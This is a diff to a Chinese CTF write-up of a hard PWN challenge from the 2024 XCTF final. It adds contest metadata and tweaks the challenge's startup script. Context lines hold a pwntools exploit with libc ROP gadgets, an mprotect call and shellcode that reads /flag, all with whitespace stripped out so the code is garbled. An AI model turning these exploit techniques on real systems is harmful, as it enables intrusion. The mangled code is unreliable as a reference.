@@ -72,6 +72,9 @@ prerequisites:
 - glibc tcache + realloc 行为
 - AES/RSA/base64 密码学 C++ 实现
 - LD_PRELOAD 动态劫持 srand
+contest_normalized: "第九届 XCTF 国际网络攻防联赛 总决赛"
+contest_year: 2024
+subcategory_guess: "rsa"
 ---
 # 详解第九届XCTF国际网络攻防联赛总决赛0解PWN题
 
@@ -570,7 +573,7 @@ frompwnimport*importbase64importhashlibfromCrypto.Util.Paddingimportpad, unpadfr
 # 13pop_rdi =0x2a3e5+ libc.addresspop_rsi =0x2be51+ libc.addresspop_rdx_rbx =0x904a9+ libc.addresspop_rax =0x0000000000045eb0+ libc.addresssyscall =0x00000000000ec079+ libc.addressorder2 =b'hx00'[::-1].hex()order1 =b'/bin/shx00'[::-1].hex()shellcode = asm(f""" mov rax, 0x00000067616c662f push rax mov rsi, rsp sub rsp, 0x100 lea rdx, [rsp] mov rax,128 mov [rdx], rax mov rax,0 mov [rdx+4],rax lea rcx, [rsp+128] mov rax, 303 mov rdi, 4 mov r8, 0 syscall mov rax, 304 mov rdi, 3 mov rsi, rdx mov rdx,0 syscall mov rbx, rax mov rax, 0 mov rdi, rbx mov rsi, rsp mov rdx, 100 syscall mov rdx, rax mov rax, 1 mov rdi, 1 mov rsi, rsp syscall""")jmp_rdi =0x00000000000b131c+ libc.addressstack_execute = p64(pop_rdi) + p64(stack &-4096) + p64(pop_rsi) + p64(0x2000) + p64(pop_rdx_rbx) + p64(7)*2+ p64(libc.sym['mprotect']) + p64(pop_rdi) + p64(stack -0x50-0xb8+0x170) + p64(jmp_rdi)stack_execute += shellcodeprint(hex(len(stack_execute)))stack_execute = stack_execute.ljust(0x140,b"x90")raw_input()payload = de_aes_text(b"MeP@ssw0rd_2024!Secur1ty_Key#123",salt,stack_execute)edit(1,base64.b64encode(payload),mode=1,password="MeP@ssw0rd_2024!Secur1ty_Key#123")
 # 13p.interactive()
 mov rax, 0x00000067616c662f push rax mov rsi, rsp sub rsp, 0x100 lea rdx, [rsp] mov rax,128 mov [rdx], rax mov rax,0 mov [rdx+4],rax lea rcx, [rsp+128] mov rax, 303 mov rdi, 4 mov r8, 0 syscall mov rax, 304 mov rdi, 3 mov rsi, rdx mov rdx,0 syscall mov rbx, rax mov rax, 0 mov rdi, rbx mov rsi, rsp mov rdx, 100 syscall mov rdx, rax mov rax, 1 mov rdi, 1 mov rsi, rsp syscall
-#!/bin/shcp /flag /home/pwn/flagchmod 666 /home/pwn/flagecho"🧹 深度清理进行中 / Scrub-a-dub-dub! Purging stale data..."FILE="/home/pwn/log/salt"if[ -f"$FILE"];then rm -f"$FILE"fiyes'🧹 ...'| head -n 10mkdir -p /home/pwn/logecho-n"aaaa">"$FILE"chmod 666"$FILE"echo"🔧 正在启动全pwn小红书 / Launching All-Pwn Red Book..."sleep 3echo" 33c"cd/home/pwntimeout 180s ./pwn
+#!/bin/shcp /flag /home/pwn/flagchmod 666 /home/pwn/flagecho"🧹 深度清理进行中 / Scrub-a-dub-dub! Purging stale data..."FILE="/home/pwn/log/salt"if[ -f"$FILE"];then rm -f"$FILE"fiyes'🧹 ...'| head -n 10mkdir -p /home/pwn/logecho-n"aaaa">"$FILE"chmod 666"$FILE"echo"🔧 正在启动全pwn小红书 / Launching All-Pwn Red Book..."sleep 3echo"\\x0033c"cd/home/pwntimeout 180s ./pwn
 ```
 
 
